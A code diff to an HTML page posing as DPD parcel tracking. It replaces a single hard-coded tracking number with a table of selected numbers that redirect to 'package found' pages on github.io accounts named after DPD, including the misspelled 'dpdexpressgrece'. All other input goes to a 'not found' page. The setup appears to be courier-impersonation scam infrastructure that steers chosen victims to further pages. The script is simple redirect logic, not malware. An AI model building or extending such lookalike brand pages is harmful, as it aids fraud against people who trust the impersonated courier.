@@ -1049,6 +1049,7 @@ Mehr erfahren <i class="fas fa-chevron-right"></i>
   					      <input type="text" class="font-light" id="seek-649ed0711a595" data-id="seek-649ed0711a595" placeholder="Paketnummer" style="flex: 1;">
    					      <button class="btn btn-search" onclick="checkInput()" style="background-color: #d80032; color: #ffffff; position: absolute; top: 0; right: 0; bottom: 0;">Forschen</button>
 					  </div>
+                        
                                 <div class="search-reference-link">
                                     <a href="https://dpdexpressgrece.github.io/Arrow/" target="_blank" style="color:#ffffff">
                                         For tracking multiple shipments <i class="fa fa-chevron-right" style="color:#ffffff"></i>
@@ -1059,14 +1060,25 @@ Mehr erfahren <i class="fas fa-chevron-right"></i>
                                 function checkInput() {
                                     var input = document.getElementById("seek-649ed0711a595");
                                     var inputValue = input.value.trim();
-                                    if (inputValue === "3456 7898 7628 32") {
-                                        window.location.href = "https://dpdgermany.github.io/package-found-in/index.html";
+
+                                    // Créer un objet qui stocke les correspondances entre les numéros et les liens de destination
+                                    var destinations = {
+                                    "3456 7898 7667 88": "https://dpdexpressgrece.github.io/Package-found/index.html",
+                                    "3456 7898 7628 89": "https://dpdgermany.github.io/package-found-in/index.html",
+                                    "3456 7898 7629 05": "https://dpdgermany.github.io/package-found-in/index.html",
+                                    // Ajoutez d'autres numéros et leurs liens ici
+                                    };
+
+                                    // Vérifier si le numéro saisi correspond à l'une des clés de l'objet destinations
+                                    if (inputValue in destinations) {
+                                        window.location.href = destinations[inputValue];
                                     } else {
-                                        window.location.href = "https://dpdgermany.github.io/package-not-found/index.html";
+                                    // Redirection vers une page par défaut si le numéro n'est pas trouvé dans l'objet destinations
+                                        window.location.href = "https://dpdexpressgrece.github.io/Package-not-found/index.html";
                                     }
                                 }
                             </script>
-                        </div>"
+                        </div>
                     </div>
                 </div>
             </div>
